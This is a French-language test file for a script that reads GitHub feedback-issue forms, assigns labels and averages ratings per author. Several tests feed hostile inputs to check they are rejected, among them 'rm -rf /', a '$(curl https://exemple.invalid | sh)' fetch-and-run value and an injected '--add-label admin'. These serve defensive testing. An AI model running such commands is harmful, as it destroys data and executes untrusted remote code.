// scripts/retours/retours.test.mjs

import { readFileSync } from "node:fs"
import { describe, expect, it } from "vitest"
import {
  agregerRetours,
  calculerEtiquettes,
  champsPresents,
  DEFINITIONS_ETIQUETTES,
  ETIQUETTES_ECARTEES,
  ETIQUETTE_RETOUR,
  etiquetteDe,
  FAMILLES,
  lireAffichage,
  lireNote,
  lireRetour,
  lireSections,
  lireType,
  OPTIONS_AFFICHAGE,
  OPTIONS_NOTE,
  OPTIONS_TYPE,
  reponsesDuTicket,
  reponsesParAuteur,
  resumerNote,
  TITRES
} from "./retours.mjs"

const SANS_REPONSE = "_No response_"

// Corps tel que GitHub l'écrit pour un ticket rempli avec le formulaire (réponses vides : « _No response_ »).
function corpsDuFormulaire({ note, affichage, type, message = "Très utile." } = {}) {
  return [
    ["Note", note],
    ["Affichage préféré", affichage],
    ["Type de retour", type],
    ["Message", message],
    ["Version", "0.9.0"],
    ["Environnement", "Démo web, Windows 11, Firefox"],
    ["Diagnostic (facultatif)", "```text\nversion: 0.9.0\n```"]
  ]
    .map(([titre, valeur]) => `### ${titre}\n\n${valeur ?? SANS_REPONSE}`)
    .join("\n\n")
}

const MAINTENANT = new Date("2026-10-05T08:00:00.000Z")

describe("formulaire .github/ISSUE_TEMPLATE/retour.yml", () => {
  const modele = readFileSync(new URL("../../.github/ISSUE_TEMPLATE/retour.yml", import.meta.url), "utf-8")

  it("propose dans ses champs texte les valeurs exportées, que l'application utilise pour le préremplir", () => {
    for (const option of [...OPTIONS_NOTE, ...OPTIONS_AFFICHAGE, ...OPTIONS_TYPE]) {
      expect(modele).toContain(`« ${option} »`)
    }
    // GitHub ne préremplit pas les listes déroulantes depuis l'adresse.
    expect(modele).not.toContain("type: dropdown")
  })

  it("a les identifiants stables et les libellés lus par les scripts", () => {
    for (const id of ["note", "affichage", "type", "message", "version", "environnement", "diagnostic"]) {
      expect(modele).toMatch(new RegExp(`^\\s+id: ${id}\\s*$`, "m"))
    }
    for (const titre of Object.values(TITRES)) expect(modele).toMatch(new RegExp(`^\\s+label: ${titre}\\s*$`, "m"))
    expect(modele).not.toMatch(/required: true/)
  })
})

describe("lireSections", () => {
  it("découpe le corps en sections, titres normalisés, valeurs sans espaces autour", () => {
    const sections = lireSections("### Note\n\n  ★★★★☆ 4/5  \n\n###   Type   de retour  \n\nBug\n")
    expect(sections.get("note")).toBe("★★★★☆ 4/5")
    expect(sections.get("type de retour")).toBe("Bug")
  })

  it("accepte les fins de ligne Windows et anciennes Mac", () => {
    expect(lireSections("### Note\r\n\r\n★★★☆☆ 3/5\r\n\r\n### Message\r\n\r\nok").get("note")).toBe("★★★☆☆ 3/5")
    expect(lireSections("### Note\r\r2/5\r").get("note")).toBe("2/5")
  })

  it("ignore le texte avant le premier titre et garde la première section d'un titre", () => {
    const sections = lireSections("préambule\n### Note\n\n1/5\n\n### Note\n\n5/5")
    expect(sections.get("note")).toBe("1/5")
    expect(sections.size).toBe(1)
  })

  it("ne prend pas un titre de niveau 4 ou sans espace pour une section", () => {
    expect(lireSections("#### Note\n\n5/5\n\n###Note\n\n4/5").size).toBe(0)
  })

  it("renvoie une table vide pour un corps vide ou qui n'est pas du texte", () => {
    expect(lireSections("").size).toBe(0)
    expect(lireSections(null).size).toBe(0)
    expect(lireSections(42).size).toBe(0)
  })
})

describe("lecture des réponses", () => {
  it("lit chaque choix de note du formulaire", () => {
    expect(OPTIONS_NOTE.map(lireNote)).toEqual([5, 4, 3, 2, 1, null])
  })

  it("lit aussi une note écrite à la main, et refuse le reste", () => {
    expect(lireNote(" 4 / 5 ")).toBe(4)
    expect(lireNote("3")).toBe(3)
    for (const valeur of ["", "0/5", "6/5", "4/10", "4,5/5", "★★★★★", "note 5/5", "5/5; rm -rf /"]) {
      expect(lireNote(valeur)).toBeNull()
    }
  })

  it("lit les affichages, sans tenir compte de la casse ni des accents", () => {
    expect(OPTIONS_AFFICHAGE.map(lireAffichage)).toEqual(["resume", "classique", "vues", null])
    expect(lireAffichage("  RESUME ")).toBe("resume")
    // Champ texte : une réponse tapée à la main, sans « Trois », est reconnue aussi.
    expect(lireAffichage("vues")).toBe("vues")
    expect(lireAffichage("trois   vues")).toBe("vues")
    expect(lireAffichage("constructor")).toBeNull()
    expect(lireAffichage("Panneaux")).toBeNull()
  })

  it("lit les types de retour", () => {
    expect(OPTIONS_TYPE.map(lireType)).toEqual(["avis", "bug", "idee"])
    expect(lireType("idee")).toBe("idee")
    expect(lireType("toString")).toBeNull()
    expect(lireType("")).toBeNull()
  })
})

describe("lireRetour", () => {
  it("lit un ticket complet", () => {
    const corps = corpsDuFormulaire({ note: "★★★★☆ 4/5", affichage: "Trois vues", type: "Idée" })
    expect(lireRetour(corps)).toEqual({ note: 4, affichage: "vues", type: "idee" })
  })

  it("renvoie null pour les réponses vides, « Sans note » et « Sans préférence »", () => {
    expect(lireRetour(corpsDuFormulaire())).toEqual({ note: null, affichage: null, type: null })
    expect(lireRetour(corpsDuFormulaire({ note: "Sans note", affichage: "Sans préférence" }))).toEqual({
      note: null,
      affichage: null,
      type: null
    })
  })

  it("renvoie null pour les sections manquantes ou un corps qui n'est pas du texte", () => {
    expect(lireRetour("Un ticket écrit sans le formulaire.")).toEqual({ note: null, affichage: null, type: null })
    expect(lireRetour("### Type de retour\n\nBug")).toEqual({ note: null, affichage: null, type: "bug" })
    expect(lireRetour(undefined)).toEqual({ note: null, affichage: null, type: null })
  })

  it("supporte les fins de ligne Windows et les espaces en trop", () => {
    const corps = corpsDuFormulaire({ note: "  ★★☆☆☆ 2/5 ", affichage: "Classique", type: " Bug " }).replace(/\n/g, "\r\n")
    expect(lireRetour(corps)).toEqual({ note: 2, affichage: "classique", type: "bug" })
  })

  it("ne se laisse pas tromper par un message qui imite les sections du formulaire", () => {
    const message = "### Note\n\n★★★★★ 5/5\n\n### Affichage préféré\n\nRésumé\n\n### Type de retour\n\nAvis"
    const corps = corpsDuFormulaire({ note: "Sans note", type: "Bug", message })
    expect(lireRetour(corps)).toEqual({ note: null, affichage: null, type: "bug" })
  })

  it("ignore un contenu hostile au lieu de l'interpréter", () => {
    const corps = corpsDuFormulaire({
      note: "$(curl https://exemple.invalid | sh)",
      affichage: "`rm -rf /`",
      type: "bug,note-5\n--add-label admin"
    })
    expect(lireRetour(corps)).toEqual({ note: null, affichage: null, type: null })
  })
})

describe("champsPresents", () => {
  it("liste les champs du formulaire présents, même sans réponse", () => {
    expect([...champsPresents(corpsDuFormulaire())]).toEqual(["note", "affichage", "type"])
    expect([...champsPresents("### Note\n\n_No response_")]).toEqual(["note"])
    expect(champsPresents("rien").size).toBe(0)
  })
})

describe("etiquetteDe", () => {
  it("donne l'étiquette de chaque réponse, null sans réponse", () => {
    expect(etiquetteDe("note", 3)).toBe("note-3")
    expect(etiquetteDe("affichage", "vues")).toBe("affichage-vues")
    expect(etiquetteDe("type", "idee")).toBe("idee")
    expect(etiquetteDe("note", null)).toBeNull()
  })

  it("couvre exactement les étiquettes des familles, toutes définies", () => {
    const etiquettes = [
      ...[1, 2, 3, 4, 5].map((note) => etiquetteDe("note", note)),
      ...["resume", "classique", "vues"].map((affichage) => etiquetteDe("affichage", affichage)),
      ...["avis", "bug", "idee"].map((type) => etiquetteDe("type", type))
    ]
    expect(etiquettes).toEqual(Object.values(FAMILLES).flat())
    expect(Object.keys(DEFINITIONS_ETIQUETTES).sort()).toEqual([ETIQUETTE_RETOUR, ...etiquettes].sort())
    for (const { couleur } of Object.values(DEFINITIONS_ETIQUETTES)) expect(couleur).toMatch(/^[0-9a-f]{6}$/)
  })
})

describe("calculerEtiquettes", () => {
  it("ajoute retour et une étiquette par réponse sur un nouveau ticket", () => {
    const corps = corpsDuFormulaire({ note: "★★★★★ 5/5", affichage: "Résumé", type: "Avis" })
    expect(calculerEtiquettes(corps, [])).toEqual({
      ajouter: ["retour", "note-5", "affichage-resume", "avis"],
      retirer: []
    })
  })

  it("n'ajoute rien de ce qui est déjà posé", () => {
    const corps = corpsDuFormulaire({ note: "★★★★★ 5/5", type: "Avis" })
    expect(calculerEtiquettes(corps, ["retour", "note-5", "avis"])).toEqual({ ajouter: [], retirer: [] })
  })

  it("remplace les étiquettes d'une réponse modifiée et retire celles d'une réponse effacée", () => {
    const corps = corpsDuFormulaire({ note: "★★☆☆☆ 2/5", affichage: "Sans préférence", type: "Bug" })
    expect(calculerEtiquettes(corps, ["retour", "note-5", "affichage-vues", "avis", "documentation"])).toEqual({
      ajouter: ["note-2", "bug"],
      retirer: ["note-5", "affichage-vues", "avis"]
    })
  })

  it("retire les étiquettes en double d'une même famille", () => {
    const corps = corpsDuFormulaire({ note: "★★★☆☆ 3/5" })
    expect(calculerEtiquettes(corps, ["retour", "note-3", "note-4"]).retirer).toEqual(["note-4"])
  })

  it("ne touche pas aux familles absentes du corps ni aux tickets écrits sans le formulaire", () => {
    expect(calculerEtiquettes("### Note\n\n4/5", ["retour", "bug", "affichage-vues"])).toEqual({
      ajouter: ["note-4"],
      retirer: []
    })
    expect(calculerEtiquettes("Le calcul de l'IS est faux.", ["bug"])).toEqual({ ajouter: [], retirer: [] })
  })

  it("ne produit que des étiquettes des listes fixes, quel que soit le corps", () => {
    const corps = corpsDuFormulaire({ note: "5/5 --add-label x", affichage: "Résumé\n\n### Note\n\n1/5", type: "Bug" })
    const { ajouter } = calculerEtiquettes(corps, [])
    for (const etiquette of ajouter) expect(Object.keys(DEFINITIONS_ETIQUETTES)).toContain(etiquette)
    expect(ajouter).toEqual(["retour", "affichage-resume", "bug"])
  })
})

describe("reponsesDuTicket", () => {
  it("lit le corps d'abord", () => {
    const ticket = { body: corpsDuFormulaire({ note: "★★★★☆ 4/5", affichage: "Classique" }), labels: [{ name: "note-1" }] }
    expect(reponsesDuTicket(ticket)).toEqual({ note: 4, affichage: "classique" })
  })

  it("garde l'absence de réponse du corps plutôt qu'une étiquette périmée", () => {
    const ticket = { body: corpsDuFormulaire({ note: "Sans note" }), labels: [{ name: "note-5" }, { name: "affichage-vues" }] }
    expect(reponsesDuTicket(ticket)).toEqual({ note: null, affichage: null })
  })

  it("se rabat sur les étiquettes quand le corps n'a pas la section", () => {
    const ticket = { body: "Écrit à la main", labels: [{ name: "retour" }, { name: "note-3" }, { name: "affichage-resume" }] }
    expect(reponsesDuTicket(ticket)).toEqual({ note: 3, affichage: "resume" })
  })

  it("ignore des étiquettes contradictoires et des données mal formées", () => {
    expect(reponsesDuTicket({ body: "", labels: [{ name: "note-3" }, { name: "note-4" }] })).toEqual({
      note: null,
      affichage: null
    })
    expect(reponsesDuTicket({ body: 12, labels: [null, { name: 5 }, { name: "note-2" }] })).toEqual({
      note: 2,
      affichage: null
    })
    expect(reponsesDuTicket({ labels: "note-5" })).toEqual({ note: null, affichage: null })
    expect(reponsesDuTicket(null)).toEqual({ note: null, affichage: null })
  })
})

describe("resumerNote", () => {
  it("écrit la note à la française avec le nombre de notes", () => {
    expect(resumerNote(4.2, 12)).toBe("4,2/5 (12 notes)")
    expect(resumerNote(4, 1)).toBe("4,0/5 (1 note)")
  })

  it("signale l'absence de note", () => {
    expect(resumerNote(null, 0)).toBe("pas encore de note")
    expect(resumerNote(3, 0)).toBe("pas encore de note")
  })
})

describe("agregerRetours", () => {
  const ticket = (reponses, labels = []) => ({ body: corpsDuFormulaire(reponses), labels: labels.map((name) => ({ name })) })

  it("renvoie un agrégat vide sans ticket", () => {
    const vide = {
      nombreDeNotes: 0,
      moyenne: null,
      preferencesAffichage: { resume: 0, classique: 0, vues: 0 },
      resume: "pas encore de note",
      misAJour: "2026-10-05T08:00:00.000Z"
    }
    expect(agregerRetours([], MAINTENANT)).toEqual(vide)
    expect(agregerRetours(undefined, MAINTENANT)).toEqual(vide)
    expect(agregerRetours({ body: "### Note\n\n5/5" }, MAINTENANT)).toEqual(vide)
  })

  it("fait la moyenne des seules notes données et compte les préférences d'affichage", () => {
    const tickets = [
      ticket({ note: "★★★★★ 5/5", affichage: "Résumé", type: "Avis" }),
      ticket({ note: "★★★★☆ 4/5", affichage: "Trois vues" }),
      ticket({ note: "Sans note", affichage: "Résumé", type: "Bug" }),
      ticket({ affichage: "Sans préférence", type: "Idée" }),
      { body: "Ticket écrit à la main", labels: [{ name: "retour" }, { name: "note-3" }, { name: "affichage-classique" }] }
    ]
    expect(agregerRetours(tickets, MAINTENANT)).toEqual({
      nombreDeNotes: 3,
      moyenne: 4,
      preferencesAffichage: { resume: 2, classique: 1, vues: 1 },
      resume: "4,0/5 (3 notes)",
      misAJour: "2026-10-05T08:00:00.000Z"
    })
  })

  it("arrondit la moyenne au dixième, sans erreur de virgule flottante", () => {
    const notes = (...valeurs) => valeurs.map((note) => ticket({ note: `${note}/5` }))
    expect(agregerRetours(notes(5, 4, 4), MAINTENANT).moyenne).toBe(4.3)
    expect(agregerRetours(notes(5, 5, 4), MAINTENANT).moyenne).toBe(4.7)
    expect(agregerRetours(notes(4, 5), MAINTENANT).moyenne).toBe(4.5)
    // 87 / 20 = 4,35 : arrondi à 4,4.
    const vingt = notes(...Array(7).fill(5), ...Array(13).fill(4))
    expect(agregerRetours(vingt, MAINTENANT)).toMatchObject({ moyenne: 4.4, resume: "4,4/5 (20 notes)" })
  })

  it("date l'agrégat de l'instant présent par défaut", () => {
    expect(Date.parse(agregerRetours([]).misAJour)).not.toBeNaN()
  })
})

describe("une voix par compte GitHub", () => {
  const ticket = (login, createdAt, reponses, labels = []) => ({ body: corpsDuFormulaire(reponses), labels: labels.map((name) => ({ name })), author: login === null ? null : { login }, createdAt })

  it("retient, pour chaque auteur, la note et l'affichage de son ticket le plus récent qui en donne", () => {
    const tickets = [
      ticket("alice", "2026-10-01T10:00:00Z", { note: "★★☆☆☆ 2/5", affichage: "Classique" }),
      ticket("alice", "2026-10-03T10:00:00Z", { note: "★★★★★ 5/5" }),
      // Plus récent, mais sans note ni affichage : il ne retire rien aux réponses précédentes.
      ticket("alice", "2026-10-04T10:00:00Z", { note: "Sans note", affichage: "Sans préférence", type: "Bug" }),
      ticket("bob", "2026-10-02T10:00:00Z", { note: "★★★☆☆ 3/5", affichage: "Trois vues" }),
      ticket("bob", "2026-09-30T10:00:00Z", { note: "★☆☆☆☆ 1/5", affichage: "Résumé" })
    ]
    expect(reponsesParAuteur(tickets)).toEqual([
      { note: 5, affichage: "classique" },
      { note: 3, affichage: "vues" }
    ])
    expect(agregerRetours(tickets, MAINTENANT)).toMatchObject({ nombreDeNotes: 2, moyenne: 4, preferencesAffichage: { resume: 0, classique: 1, vues: 1 }, resume: "4,0/5 (2 notes)" })
  })

  it("ne dépend pas de l'ordre des tickets", () => {
    const ancien = ticket("alice", "2026-10-01T10:00:00Z", { note: "★☆☆☆☆ 1/5" })
    const recent = ticket("alice", "2026-10-02T10:00:00Z", { note: "★★★★☆ 4/5" })
    expect(reponsesParAuteur([ancien, recent])).toEqual(reponsesParAuteur([recent, ancien]))
    expect(reponsesParAuteur([recent, ancien])).toEqual([{ note: 4, affichage: null }])
  })

  it("écarte les tickets étiquetés « invalide » ou « spam »", () => {
    expect(ETIQUETTES_ECARTEES).toEqual(["invalide", "spam"])
    const tickets = [
      ticket("alice", "2026-10-01T10:00:00Z", { note: "★★★★☆ 4/5" }),
      ticket("alice", "2026-10-02T10:00:00Z", { note: "★☆☆☆☆ 1/5" }, ["retour", "spam"]),
      ticket("troll", "2026-10-02T10:00:00Z", { note: "★☆☆☆☆ 1/5", affichage: "Classique" }, ["invalide"])
    ]
    expect(agregerRetours(tickets, MAINTENANT)).toMatchObject({ nombreDeNotes: 1, moyenne: 4, preferencesAffichage: { resume: 0, classique: 0, vues: 0 } })
  })

  it("compte à part chaque ticket sans auteur connu, et accepte une date absente ou invalide", () => {
    const tickets = [
      ticket(null, "2026-10-01T10:00:00Z", { note: "★★★★★ 5/5" }),
      ticket("", undefined, { note: "★★★☆☆ 3/5" }),
      { body: corpsDuFormulaire({ note: "★★★★☆ 4/5" }), labels: "pas un tableau", author: { login: "carole" }, createdAt: "pas une date" }
    ]
    expect(reponsesParAuteur(tickets).map((reponse) => reponse.note)).toEqual([5, 3, 4])
    expect(reponsesParAuteur("pas un tableau")).toEqual([])
  })
})
